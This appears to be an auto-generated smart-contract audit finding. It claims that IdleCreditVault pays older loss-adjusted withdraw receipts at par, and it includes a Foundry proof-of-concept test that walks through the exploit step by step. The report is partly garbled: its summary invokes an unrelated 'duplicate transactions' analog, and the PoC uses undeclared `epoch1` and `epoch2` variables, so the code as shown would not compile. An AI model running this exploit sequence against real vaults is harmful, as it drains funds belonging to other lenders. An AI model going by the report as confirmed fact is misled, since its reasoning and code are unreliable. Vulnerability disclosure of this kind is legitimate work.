### Title
Loss-adjusted withdraw receipts from older loss epochs are paid at par via the aggregate funded-claim path, draining the vault reserve - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
The analog to "proposals cannot contain duplicate transactions" is the "one receipt, one payout — and only through one path" invariant in `IdleCreditVault.claimWithdrawRequest`. The vault tracks pending receipts both as a per-epoch map (`withdrawsRequestsByEpoch`) and as a single aggregate (`withdrawsRequests`). The loss-adjusted claim path only ever examines the *last* request epoch (`lastWithdrawRequest[_user]`), while the funded-claim path pays the entire remaining aggregate at par. A user holding receipts in **two different loss-adjusted epochs** gets the older loss receipt paid in full (no haircut), overpaying them out of underlyings that belong to other claimants. [1](#0-0) [2](#0-1) 

### Finding Description
`requestWithdraw` records each receipt in `withdrawsRequestsByEpoch[user][epoch]` and adds it to the aggregate `withdrawsRequests[user]`, and sets `lastWithdrawRequest[user] = currentEpoch`. When `stopEpochWithDuration(_lossAmount)` causes the borrower to underfund pending receipts, `collectWithdrawFunds` zeroes `pendingWithdraws` and stores `lossRecoveryPriceByEpoch[epochNumber] = _amount * RECOVERY_FULL / pendingBasis` (IdleCreditVault.sol:411-430).

On claim, `claimWithdrawRequest` runs three paths in sequence:

1. `_claimLossAdjustedWithdrawRequest` looks up `lossRecoveryPriceByEpoch[lastWithdrawRequest[user]]` — i.e. only the *most recent* request epoch. `_clearWithdrawClaimForEpoch` zeroes `withdrawsRequestsByEpoch[user][lossEpoch]` and subtracts that epoch's piece from the aggregate (IdleCreditVault.sol:811-836), and resets `lastWithdrawRequest[user] = 0` only when the cleared epoch equals it.
2. `_claimFundedWithdrawRequest` then pays `withdrawsRequests[user]` **at par**, with no check that the remaining entries correspond to fully-funded epochs (IdleCreditVault.sol:326-349).

The per-epoch haircut in `lossRecoveryPriceByEpoch` is therefore only ever applied to the last request epoch. Any earlier epoch whose receipts were also loss-adjusted (its `lossRecoveryPriceByEpoch` is still set, but it is unreachable because the lookup key is `lastWithdrawRequest`) is paid 1:1 via the funded path. The vault only collected `claimBasis * lossRecoveryPrice` for that epoch, so the difference is stolen from underlyings that back other users' claims.

Broken invariant: each receipt must be paid once, at the recovery price recorded for *its* epoch. Instead, identical pending receipts are treated as fungible in the aggregate ledger, and the dedup/epoch-keying in `_claimLossAdjustedWithdrawRequest` only covers the latest epoch.

### Impact Explanation
Direct theft / insolvency. Attacker profit = `olderReceiptBasis * (1 - lossRecoveryPrice[olderLossEpoch]) / RECOVERY_FULL`. E.g. with a 10,000 USDC receipt and a 70% recovery price in epoch N, the attacker receives 10,000 instead of 7,000 — extracting 3,000 USDC that was never funded by the borrower for that epoch, at the expense of the vault's funded-claim reserve (and, post-default, the `defaultRecoveryReserve`, since `_transferFundedClaim` spends it when non-zero). If the vault cannot cover it, later claimants are permanently undercollateralized.

### Likelihood Explanation
Requires the manager/borrower sequence to produce two `stopEpochWithDuration` losses in different epochs while the attacker holds unclaimed receipts in both — i.e., the attacker simply does not claim between the two loss epochs (the code explicitly notes an unclaimed receipt forces waiting an extra epoch, but never forbids stacking). No privileged misbehavior is needed: the attacker is a KYC-passing lender calling `requestWithdraw` before each loss epoch and `claimWithdrawRequest` after. No existing guard stops it: `_checkNotAllowed(epochNumber <= lastWithdrawRequest)` only gates timing, `_settleApr0` doesn't touch this accounting, and the `defaultRecoveryFinalized` branch doesn't fix the par payout for the stale loss epoch (the defaulted-epoch clear again uses only `defaultRecoveryEpoch`, not the older loss epoch). A reproducible Foundry fork PoC is straightforward by extending the existing `IdleCreditVault.t.sol` harness (`_stopEpochAndCheckPrices` with reduced `_expectedFundsEndEpoch` twice, with an unclaimed receipt surviving the first loss).

### Recommendation
In `_claimLossAdjustedWithdrawRequest` (or `claimWithdrawRequest`), iterate/check all epochs with `lossRecoveryPriceByEpoch != 0` recorded in `withdrawsRequestsByEpoch[user]`, not just `lastWithdrawRequest[user]`; or track a per-user pointer/bitmap of loss-adjusted epochs and apply each epoch's recovery price before allowing the aggregate `withdrawsRequests` to be paid at par. Alternatively, keep a separate `fundedWithdrawsRequests` counter so only fully-funded basis can flow through `_claimFundedWithdrawRequest`.

### Proof of Concept
```solidity
// Foundry fork PoC (extend test/foundry/IdleCreditVault.t.sol harness)
// Attacker = KYC'd lender. Sequence assumes honest manager/borrower calls.

function testDoubleLossEpochPaysOlderReceiptAtPar() external {
    uint256 amount = 10_000 * ONE_SCALE;
    address attacker = makeAddr("attacker");
    _depositWithUser(attacker, amount, true);   // AA tranche

    // --- Epoch 0 runs, stops healthy ---
    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr / 2, _expectedFundsEndEpoch());

    // Attacker requests withdraw of receipt R1 in epoch 1 buffer
    uint256 aa1 = IERC20Detailed(AAtranche).balanceOf(attacker) / 2;
    vm.prank(attacker);
    uint256 r1Basis = cdoEpoch.requestWithdraw(aa1, address(AAtranche));

    // --- Epoch 1 ends WITH A LOSS (borrower underfunds pending receipts) ---
    _startEpochAndCheckPrices(1);
    // manager stops epoch with loss so collectWithdrawFunds stores
    // lossRecoveryPriceByEpoch[epoch1] = e.g. 0.7e18 and pendingWithdraws = 0
    _stopEpochAndCheckPrices(1, initialProvidedApr / 2, _expectedFundsEndEpoch() * 7 / 10);
    // Attacker intentionally does NOT claim R1.

    // --- Epoch 2 buffer: attacker requests another withdraw R2 ---
    uint256 aa2 = IERC20Detailed(AAtranche).balanceOf(attacker);
    vm.prank(attacker);
    uint256 r2Basis = cdoEpoch.requestWithdraw(aa2, address(AAtranche));

    // --- Epoch 2 also ends with a loss (recovery e.g. 0.8e18) ---
    _startEpochAndCheckPrices(2);
    _stopEpochAndCheckPrices(2, initialProvidedApr / 4, _expectedFundsEndEpoch() * 8 / 10);

    IdleCreditVault vault = IdleCreditVault(address(strategy));
    uint256 lossPrice1 = vault.lossRecoveryPriceByEpoch(epoch1); // e.g. 0.7e18
    uint256 lossPrice2 = vault.lossRecoveryPriceByEpoch(epoch2); // e.g. 0.8e18
    assertGt(lossPrice1, 0);
    assertGt(lossPrice2, 0);

    // Vault only ever received r1Basis*lossPrice1 + r2Basis*lossPrice2 for these receipts
    uint256 balPre = IERC20Detailed(defaultUnderlying).balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();
    uint256 got = IERC20Detailed(defaultUnderlying).balanceOf(attacker) - balPre;

    uint256 expectedCorrect = r1Basis * lossPrice1 / 1e18 + r2Basis * lossPrice2 / 1e18;
    // BUG: R1 is paid at par because _claimLossAdjustedWithdrawRequest only checks
    // lossRecoveryPriceByEpoch[lastWithdrawRequest] (= epoch2); R1's remainder in
    // withdrawsRequests is then paid 1:1 by _claimFundedWithdrawRequest.
    assertEq(got, r1Basis + r2Basis * lossPrice2 / 1e18, 'older loss receipt paid at par');
    assertGt(got, expectedCorrect, 'attacker overpaid by r1Basis*(1-lossPrice1)');
}
```

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L338-349)
```text
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L789-800)
```text
  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
```
